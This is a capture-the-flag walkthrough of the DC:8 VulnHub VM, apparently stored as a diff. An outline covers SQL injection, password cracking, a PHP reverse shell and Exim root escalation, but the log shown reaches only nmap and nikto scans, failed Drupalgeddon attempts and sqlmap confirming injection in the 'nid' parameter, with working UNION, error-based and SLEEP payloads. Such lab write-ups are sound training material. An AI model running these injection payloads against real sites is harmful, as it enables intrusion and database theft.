@@ -1,0 +1,2288 @@
+========================================================================================================================
+Walkthrough of the 'DC:8' VulnHub VM CTF 
+========================================================================================================================
+
+Step 1. Scanning & Enumeration (nmap + dirb + manual tests)
+        > SSH 22 - open
+        > HTTP 80 - open (Website based on a Drupal CMS v7)
+		
+Step 2. Gaining access
+        Note: First I tried several public exploits against the Drupal CMS website (old version 7) but it failed so I moved on..
+
+        2.1. Assess the security of the Website and find out that the parameter "/?node=" is prone to a SQL injection vulnerability
+        2.2. Using SQLmap, list the databases and dump the content of the table "users" from the database "d7db" which contains 2 logins (admin, john) and their password hashes
+        (note: the SQLi is not running with dba privileges)
+        2.3. Perform a password bruteforce attack and crack the password of the account "john"
+        2.4. Log into the Website as "john"
+        2.5. The Website allows you to create/edit Web pages and Web forms and to save them in the format "PHP code" 
+        2.6. Edit the Webform page "Contact Us" by adding a basic PHP reverse shell
+        2.7. Trigger your PHP reverse shell by submitting fake contact details in the page "Contact Us"
+        2.8. Obtain a reverse shell as "www-data"
+		
+Step 3. Post-exploitation - Linux enumeration (LinEnum.sh + Linux-Exploit-Suggester.sh)
+
+Step 4. Privilege escalation to ROOT
+        A SUID root binary 'exim4' is prone to a code execution vulnerability (CVE-2019-10149 - raptor_exim_wiz)
+		    => shell with ROOT privileges
+		
+
+========================================================================================================================
+Step 1. Scanning & Enumeration
+========================================================================================================================
+
+root@kali:/home/jeff# nmap -sS -sV -sC -v -p 1-65535 192.168.1.14
+
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-19 23:29 CEST
+NSE: Loaded 153 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating NSE at 23:29
+Completed NSE at 23:29, 0.00s elapsed
+Initiating NSE at 23:29
+Completed NSE at 23:29, 0.00s elapsed
+Initiating NSE at 23:29
+Completed NSE at 23:29, 0.00s elapsed
+Initiating Ping Scan at 23:29
+Scanning 192.168.1.14 [4 ports]
+Completed Ping Scan at 23:29, 0.00s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 23:29
+Completed Parallel DNS resolution of 1 host. at 23:29, 0.01s elapsed
+Initiating SYN Stealth Scan at 23:29
+Scanning dc-8.home (192.168.1.14) [65535 ports]
+Discovered open port 22/tcp on 192.168.1.14
+Discovered open port 80/tcp on 192.168.1.14
+SYN Stealth Scan Timing: About 19.44% done; ETC: 23:31 (0:02:08 remaining)
+SYN Stealth Scan Timing: About 46.98% done; ETC: 23:31 (0:01:09 remaining)
+Completed SYN Stealth Scan at 23:31, 113.28s elapsed (65535 total ports)
+Initiating Service scan at 23:31
+Scanning 2 services on dc-8.home (192.168.1.14)
+Completed Service scan at 23:31, 6.09s elapsed (2 services on 1 host)
+NSE: Script scanning 192.168.1.14.
+Initiating NSE at 23:31
+Completed NSE at 23:31, 1.02s elapsed
+Initiating NSE at 23:31
+Completed NSE at 23:31, 0.07s elapsed
+Initiating NSE at 23:31
+Completed NSE at 23:31, 0.00s elapsed
+Nmap scan report for dc-8.home (192.168.1.14)
+Host is up (0.014s latency).
+Not shown: 65533 filtered ports
+
+PORT   STATE SERVICE VERSION
+
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 35:a7:e6:c4:a8:3c:63:1d:e1:c0:ca:a3:66:bc:88:bf (RSA)
+|   256 ab:ef:9f:69:ac:ea:54:c6:8c:61:55:49:0a:e7:aa:d9 (ECDSA)
+|_  256 7a:b2:c6:87:ec:93:76:d4:ea:59:4b:1b:c6:e8:73:f2 (ED25519)
+
+80/tcp open  http    Apache httpd
+|_http-favicon: Unknown favicon MD5: CF2445DCB53A031C02F9B57E2199BC03
+|_http-generator: Drupal 7 (http://drupal.org)
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+| http-robots.txt: 36 disallowed entries (15 shown)
+| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
+| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
+| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
+|_/LICENSE.txt /MAINTAINERS.txt
+|_http-server-header: Apache
+|_http-title: Welcome to DC-8 | DC-8
+
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+NSE: Script Post-scanning.
+Initiating NSE at 23:31
+Completed NSE at 23:31, 0.00s elapsed
+Initiating NSE at 23:31
+Completed NSE at 23:31, 0.00s elapsed
+Initiating NSE at 23:31
+Completed NSE at 23:31, 0.00s elapsed
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 121.59 seconds
+           Raw packets sent: 131159 (5.771MB) | Rcvd: 130816 (5.413MB)
+
+
+----------------------------------------------------------------------------------------------------------
+
+jeff@kali:~$ nikto -h http://192.168.1.14
+
+- Nikto v2.1.6
+---------------------------------------------------------------------------
++ Target IP:          192.168.1.14
++ Target Hostname:    192.168.1.14
++ Target Port:        80
++ Start Time:         2021-05-19 23:30:18 (GMT2)
+---------------------------------------------------------------------------
+
++ Server: Apache
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ Uncommon header 'link' found, with contents: </node/1>; rel="canonical",</node/1>; rel="shortlink"
++ Uncommon header 'x-generator' found, with contents: Drupal 7 (http://drupal.org)
++ Entry '/INSTALL.mysql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/INSTALL.pgsql.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/INSTALL.sqlite.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/install.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/LICENSE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/MAINTAINERS.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/UPGRADE.txt' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/xmlrpc.php' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/?q=filter/tips/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/?q=user/password/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ Entry '/?q=user/login/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 68 entries which should be manually viewed.
++ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ /: A database error may reveal internal details about the running database.
++ OSVDB-3092: /web.config: ASP config file is accessible.
++ OSVDB-3092: /user/: This might be interesting...
++ OSVDB-3092: /UPGRADE.txt: Default file found.
++ OSVDB-3092: /install.php: Drupal install.php file found.
++ OSVDB-3092: /install.php: install.php file found.
++ OSVDB-3092: /LICENSE.txt: License file found may identify site software.
++ OSVDB-3092: /xmlrpc.php: xmlrpc.php was found.
++ OSVDB-3233: /INSTALL.mysql.txt: Drupal installation file found.
++ OSVDB-3233: /INSTALL.pgsql.txt: Drupal installation file found.
++ OSVDB-3233: /icons/README: Apache default file found.
+
++ 8794 requests: 0 error(s) and 31 item(s) reported on remote host        
+                                                                                                                                                                 
++ End Time:           2021-05-19 23:34:26 (GMT2) (248 seconds)                                                                                                                                                                             
+---------------------------------------------------------------------------                                                                                                                                                                
++ 1 host(s) tested   
+
+
+-------------------------------------------------------------------------------------------------------
+
+root@kali:/home/jeff# curl http://192.168.1.14/install.php
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
+  <head>
+    <title>Drupal already installed | Drupal</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
+<SNIP>
+
+-> Drupal CMS version 7
+
+
+
+========================================================================================================================
+Step 2. Gaining access
+========================================================================================================================
+
+root@kali:/home/jeff# searchsploit drupal 7
+
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                                                 |  Path
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Drupal 4.1/4.2 - Cross-Site Scripting                                                                                                                                          | php/webapps/22940.txt
+Drupal 4.5.3 < 4.6.1 - Comments PHP Injection                                                                                                                                  | php/webapps/1088.pl
+Drupal 4.7 - 'Attachment mod_mime' Remote Command Execution                                                                                                                    | php/webapps/1821.php
+Drupal 4.x - URL-Encoded Input HTML Injection                                                                                                                                  | php/webapps/27020.txt
+Drupal 5.2 - PHP Zend Hash ation Vector                                                                                                                                        | php/webapps/4510.txt
+Drupal 6.15 - Multiple Persistent Cross-Site Scripting Vulnerabilities                                                                                                         | php/webapps/11060.txt
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Add Admin User)                                                                                                              | php/webapps/34992.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Admin Session)                                                                                                               | php/webapps/44355.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (1)                                                                                                    | php/webapps/34984.py
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (PoC) (Reset Password) (2)                                                                                                    | php/webapps/34993.php
+Drupal 7.0 < 7.31 - 'Drupalgeddon' SQL Injection (Remote Code Execution)                                                                                                       | php/webapps/35150.php
+Drupal 7.12 - Multiple Vulnerabilities                                                                                                                                         | php/webapps/18564.txt
+Drupal 7.x Module Services - Remote Code Execution                                                                                                                             | php/webapps/41564.php
+Drupal < 4.7.6 - Post Comments Remote Command Execution                                                                                                                        | php/webapps/3313.pl
+Drupal < 5.1 - Post Comments Remote Command Execution                                                                                                                          | php/webapps/3312.pl
+Drupal < 5.22/6.16 - Multiple Vulnerabilities                                                                                                                                  | php/webapps/33706.txt
+Drupal < 7.34 - Denial of Service                                                                                                                                              | php/dos/35415.txt
+Drupal < 7.34 - Denial of Service                                                                                                                                              | php/dos/35415.txt
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code (Metasploit)                                                                                                       | php/webapps/44557.rb
+Drupal < 7.58 - 'Drupalgeddon3' (Authenticated) Remote Code Execution (PoC)                                                                                                    | php/webapps/44542.txt
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                            | php/webapps/44449.rb
+Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution                                                                                            | php/webapps/44449.rb
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                        | php/remote/44482.rb
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (Metasploit)                                                                                        | php/remote/44482.rb
+Drupal < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Execution (PoC)                                                                                               | php/webapps/44448.py
+Drupal < 8.5.11 / < 8.6.10 - RESTful Web Services unserialize() Remote Command Execution (Metasploit)                                                                          | php/remote/46510.rb
+Drupal < 8.6.10 / < 8.5.11 - REST Module Remote Code Execution                                                                                                                 | php/webapps/46452.txt
+Drupal < 8.6.9 - REST Module Remote Code Execution                                                                                                                             | php/webapps/46459.py
+Drupal avatar_uploader v7.x-1.0-beta8 - Arbitrary File Disclosure                                                                                                              | php/webapps/44501.txt
+Drupal Module CKEditor < 4.1WYSIWYG (Drupal 6.x/7.x) - Persistent Cross-Site Scripting                                                                                         | php/webapps/25493.txt
+Drupal Module CODER 2.5 - Remote Command Execution (Metasploit)                                                                                                                | php/webapps/40149.rb
+Drupal Module Coder < 7.x-1.3/7.x-2.6 - Remote Code Execution                                                                                                                  | php/remote/40144.php
+Drupal Module Cumulus 5.x-1.1/6.x-1.4 - 'tagcloud' Cross-Site Scripting                                                                                                        | php/webapps/35397.txt
+Drupal Module Drag & Drop Gallery 6.x-1.5 - 'upload.php' Arbitrary File Upload                                                                                                 | php/webapps/37453.php
+Drupal Module Embedded Media Field/Media 6.x : Video Flotsam/Media: Audio Flotsam - Multiple Vulnerabilities                                                                   | php/webapps/35072.txt
+Drupal Module RESTWS 7.x - PHP Remote Code Execution (Metasploit)                                                                                                              | php/remote/40130.rb
+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+
+=> I tried several public exploits against the Drupal CMS website (old version 7) but it failed:
+
+
+DRUPALgeddon 1 exploit failed
+===============================
+
+root@kali:/home/jeff/Documents/CTFs/DC8/Drupal exploits# python2 drupal-v7-geddon2.py 
+[{"command":"settings","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"fUP4RrkttIPY-MmumE-5vRbYFOnw6axGOC953sz84Gg"}},"merge":true},{"command":"insert","method":"replaceWith","selector":null,"data":"\u003Cdiv class=\u0022messages error\u0022\u003E\n\u003Ch2 class=\u0022element-invisible\u0022\u003EError message\u003C\/h2\u003E\n\u003Cem class=\u0022placeholder\u0022\u003ENotice\u003C\/em\u003E: Undefined index: #suffix in \u003Cem class=\u0022placeholder\u0022\u003Efile_ajax_upload()\u003C\/em\u003E (line \u003Cem class=\u0022placeholder\u0022\u003E284\u003C\/em\u003E of \u003Cem class=\u0022placeholder\u0022\u003E\/var\/www\/html\/modules\/file\/file.module\u003C\/em\u003E).\u003C\/div\u003E\n\u003Cdiv class=\u0022form-item form-type-textfield form-item-name\u0022\u003E\n  \u003Clabel for=\u0022edit-name\u0022\u003EUsername or e-mail address \u003Cspan class=\u0022form-required\u0022 title=\u0022This field is required.\u0022\u003E*\u003C\/span\u003E\u003C\/label\u003E\n \u003Cinput type=\u0022text\u0022 id=\u0022edit-name\u0022 name=\u0022name\u0022 value=\u0022\u0022 size=\u002260\u0022 maxlength=\u0022254\u0022 class=\u0022form-text required\u0022 \/\u003E\n\u003C\/div\u003E\n\u003Cspan class=\u0022ajax-new-content\u0022\u003E\u003C\/span\u003E","settings":{"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"fUP4RrkttIPY-MmumE-5vRbYFOnw6axGOC953sz84Gg"}}}]
+
+
+
+DRUPALgeddon 2 exploit failed
+===============================
+
+root@kali:/home/jeff/Documents/CTFs/DC8/Drupal exploits# python2 44448.py
+################################################################
+# Proof-Of-Concept for CVE-2018-7600
+# by Vitalii Rudnykh
+# Thanks by AlbinoDrought, RicterZ, FindYanot, CostelSalanders
+# https://github.com/a2u/CVE-2018-7600
+################################################################
+Provided only for educational or information purposes
+
+Enter target url (example: https://domain.ltd/): 'http://192.168.1.14/'
+Not exploitable
+
+
+root@kali:/home/jeff/Documents/CTFs/DC8/Drupal exploits# ruby drupalgeddon2.rb http://192.168.1.14/
+[*] --==[::#Drupalggedon2::]==--
+--------------------------------------------------------------------------------
+[i] Target : http://192.168.1.14/
+--------------------------------------------------------------------------------
+[+] Found  : http://192.168.1.14/CHANGELOG.txt    (HTTP Response: 200)
+[!] WARNING: Might be patched! Found SA-CORE-2018-002: ["http://192.168.1.14/CHANGELOG.txt", "http://192.168.1.14/core/CHANGELOG.txt", "http://192.168.1.14/includes/bootstrap.inc", "http://192.168.1.14/core/includes/bootstrap.inc", "http://192.168.1.14/includes/database.inc", "http://192.168.1.14/"]
+[-] Didn't detect Drupal version
+
+root@kali:/home/jeff/Documents/CTFs/DC8/Drupal exploits# 
+
+
+------------------------------
+
+
+=> So I start assessing manually the Website and I found out that the parameter "nid" is prone to a sql injection vulnerability 
+
+website URLs:
+- http://192.168.1.14/?nid=1
+- http://192.168.1.14/?nid=2
+- http://192.168.1.14/?nid=3
+
+
+jeff@kali:~$ curl 'http://192.168.1.14/?nid=1"'
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en" dir="ltr">
+<head>
+  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
+<link rel="shortcut icon" href="http://192.168.1.14/misc/favicon.ico" type="image/vnd.microsoft.icon" />
+  <title>Error | DC-8</title>
+  <style type="text/css" media="all">
+@import url("http://192.168.1.14/sites/all/modules/ctools/css/ctools.css?pxeoma");
+@import url("http://192.168.1.14/themes/bartik/css/maintenance-page.css?pxeoma");
+</style>
+<style type="text/css" media="all">
+@import url("http://192.168.1.14/themes/bartik/css/layout.css?pxeoma");
+@import url("http://192.168.1.14/themes/bartik/css/style.css?pxeoma");
+@import url("http://192.168.1.14/themes/bartik/css/colors.css?pxeoma");
+</style>
+<style type="text/css" media="print">
+@import url("http://192.168.1.14/themes/bartik/css/print.css?pxeoma");
+</style>
+  <script type="text/javascript" src="http://192.168.1.14/misc/jquery.js?v=1.4.4"></script>
+<script type="text/javascript" src="http://192.168.1.14/misc/jquery-extend-3.4.0.js?v=1.4.4"></script>
+<script type="text/javascript" src="http://192.168.1.14/misc/jquery.once.js?v=1.2"></script>
+<script type="text/javascript" src="http://192.168.1.14/misc/drupal.js?pxeoma"></script>
+<script type="text/javascript">
+<!--//--><![CDATA[//><!--
+jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"","ajaxPageState":{"theme":"bartik","theme_token":"3F608T-S-tlAQlPJUTOLtPWPcKuF2MtMRZNfdBKxWoA","css":{"sites\/all\/modules\/ctools\/css\/ctools.css":1,"themes\/bartik\/css\/maintenance-page.css":1,"themes\/bartik\/css\/layout.css":1,"themes\/bartik\/css\/style.css":1,"themes\/bartik\/css\/colors.css":1,"themes\/bartik\/css\/print.css":1},"js":{"misc\/jquery.js":1,"misc\/jquery-extend-3.4.0.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1}}});
+//--><!]]>
+</script>
+</head>
+<body class="maintenance-page in-maintenance no-sidebars" >
+
+  <div id="skip-link">
+    <a href="#main-content" class="element-invisible element-focusable">Skip to main content</a>
+  </div>
+
+  <div id="page-wrapper"><div id="page">
+
+    <div id="header"><div class="section clearfix">
+              <div id="name-and-slogan">
+                      <div id="site-name">
+              <strong>
+                <a href="/" title="Home" rel="home"><span>DC-8</span></a>
+              </strong>
+            </div>
+                            </div> <!-- /#name-and-slogan -->
+          </div></div> <!-- /.section, /#header -->
+
+    <div id="main-wrapper"><div id="main" class="clearfix">
+      <div id="content" class="column"><div class="section">
+        <a id="main-content"></a>
+        <h1 class="title" id="page-title">Error</h1>        The website encountered an unexpected error. Please try again later.                  <div id="messages"><div class="section clearfix">
+            <div class="messages error">
+<h2 class="element-invisible">Error message</h2>
+<em class="placeholder">PDOException</em>: SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#039;&quot;&#039; at line 1: SELECT title FROM node WHERE nid = 1&quot;; Array
+(
+)
+ in <em class="placeholder">mypages_init()</em> (line <em class="placeholder">6</em> of <em class="placeholder">/var/www/html/sites/all/modules/mypages/mypages.module</em>).</div>
+          </div></div> <!-- /.section, /#messages -->
+              </div></div> <!-- /.section, /#content -->
+    </div></div> <!-- /#main, /#main-wrapper -->
+
+  </div></div> <!-- /#page, /#page-wrapper -->
+
+</body>
+</html>
+
+
+=> Let's use SQLmap...
+
+
+jeff@kali:~$ sqlmap -f -u "http://192.168.1.14/?nid=1*"
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.5.4#stable}
+|_ -| . [.]     | .'| . |                                                                                                                                                                                                                  
+|___|_  [,]_|_|_|__,|  _|                                                                                                                                                                                                                  
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
+                                                                                                                                                                                                                                           
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program                                                                                                                                                                                 
+                                                                                                                                                                                                                                           
+[*] starting @ 00:40:26 /2021-05-20/                                                                                                                                                                                                       
+                                                                                                                                                                                                                                           
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y                                                                                                                                                   
+[00:40:31] [INFO] testing connection to the target URL
+[00:40:31] [INFO] checking if the target is protected by some kind of WAF/IPS
+[00:40:31] [INFO] testing if the target URL content is stable
+[00:40:32] [WARNING] target URL content is not stable (i.e. content differs). sqlmap will base the page comparison on a sequence matcher. If no dynamic nor injectable parameters are detected, or in case of junk results, refer to user's manual paragraph 'Page comparison'
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+[00:40:38] [INFO] testing if URI parameter '#1*' is dynamic
+[00:40:38] [WARNING] URI parameter '#1*' does not appear to be dynamic
+[00:40:38] [INFO] heuristic (basic) test shows that URI parameter '#1*' might be injectable (possible DBMS: 'MySQL')
+[00:40:38] [INFO] testing for SQL injection on URI parameter '#1*'
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[00:40:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[00:40:51] [WARNING] reflective value(s) found and filtering out
+[00:40:51] [INFO] URI parameter '#1*' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Status message")
+[00:40:51] [INFO] testing 'Generic inline queries'
+[00:40:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
+[00:40:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
+[00:40:51] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
+[00:40:51] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
+[00:40:51] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
+[00:40:51] [WARNING] potential permission problems detected ('command denied')
+[00:40:51] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
+[00:40:51] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
+[00:40:51] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
+[00:40:52] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
+[00:40:52] [INFO] URI parameter '#1*' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
+[00:40:52] [INFO] testing 'MySQL inline queries'
+[00:40:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
+[00:40:52] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                                               
+[00:40:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
+[00:40:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
+[00:40:52] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
+[00:40:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
+[00:40:52] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[00:40:52] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
+[00:41:03] [INFO] URI parameter '#1*' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
+[00:41:03] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
+[00:41:03] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+[00:41:03] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[00:41:03] [INFO] target URL appears to have 1 column in query
+[00:41:03] [INFO] URI parameter '#1*' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
+URI parameter '#1*' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 47 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://192.168.1.14:80/?nid=1 AND 3105=3105
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 2597 FROM(SELECT COUNT(*),CONCAT(0x7170767a71,(SELECT (ELT(2597=2597,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 1876 FROM (SELECT(SLEEP(5)))DhtJ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: http://192.168.1.14:80/?nid=-1157 UNION ALL SELECT CONCAT(0x7170767a71,0x674f644e4354416a506e51436b65555552715a7a79527a4e5754794b4c7a786a63456f4f614c4851,0x716a767071)-- -
+---
+[00:41:19] [INFO] testing MySQL
+[00:41:19] [INFO] confirming MySQL
+[00:41:19] [INFO] the back-end DBMS is MySQL
+[00:41:19] [INFO] actively fingerprinting MySQL
+[00:41:19] [INFO] executing MySQL comment injection fingerprint
+web application technology: Apache
+back-end DBMS: active fingerprint: MySQL >= 5.5
+               comment injection fingerprint: MySQL 5.6.49
+               html error message fingerprint: MySQL
+               fork fingerprint: MariaDB
+[00:41:20] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 29 times
+[00:41:20] [INFO] fetched data logged to text files under '/home/jeff/.local/share/sqlmap/output/192.168.1.14'
+
+[*] ending @ 00:41:20 /2021-05-20/
+
+
+------------------------------------
+
+=> The SQLi is not running with DBA privs...
+
+jeff@kali:~$ sqlmap --is-dba --privileges -u "http://192.168.1.14/?nid=1*"
+        ___
+       __H__                                                                                                                                                                                                                               
+ ___ ___[']_____ ___ ___  {1.5.4#stable}                                                                                                                                                                                                   
+|_ -| . [(]     | .'| . |                                                                                                                                                                                                                  
+|___|_  [(]_|_|_|__,|  _|                                                                                                                                                                                                                  
+      |_|V...       |_|   http://sqlmap.org                                                                                                                                                                                                
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 00:42:10 /2021-05-20/
+
+custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
+[00:42:14] [INFO] resuming back-end DBMS 'mysql' 
+[00:42:14] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://192.168.1.14:80/?nid=1 AND 3105=3105
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 2597 FROM(SELECT COUNT(*),CONCAT(0x7170767a71,(SELECT (ELT(2597=2597,1))),0x716a767071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: http://192.168.1.14:80/?nid=1 AND (SELECT 1876 FROM (SELECT(SLEEP(5)))DhtJ)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 1 column
+    Payload: http://192.168.1.14:80/?nid=-1157 UNION ALL SELECT CONCAT(0x7170767a71,0x674f644e4354416a506e51436b65555552715a7a79527a4e5754794b4c7a786a63456f4f614c4851,0x716a767071)-- -
+---
+[00:42:14] [INFO] the back-end DBMS is MySQL
+web application technology: Apache
+back-end DBMS: MySQL 5 (MariaDB fork)
+[00:42:14] [INFO] testing if current user is DBA
+[00:42:14] [INFO] fetching current user
+[00:42:15] [WARNING] reflective value(s) found and filtering out
+[00:42:15] [WARNING] potential permission problems detected ('command denied')
+[00:42:15] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+current user is DBA: False
+[00:42:15] [INFO] fetching database users privileges
+database management system users privileges:
+[*] 'dbuser'@'localhost' [1]:
+    privilege: USAGE
+
+[00:42:15] [WARNING] HTTP error codes detected during run:
+500 (Internal Server Error) - 4 times
+[00:42:15] [INFO] fetched data logged to text files under '/home/jeff/.local/share/sqlmap/output/192.168.1.14'
+
+[*] ending @ 00:42:15 /2021-05-20/
+
+-----------------------
+
+=> We list the databases...
+
+jeff@kali:~$ sqlmap  --dbs -u "http://192.168.1.14/?nid=1*"
+        ___
+       __H__                                                                                                                                                                                                                               
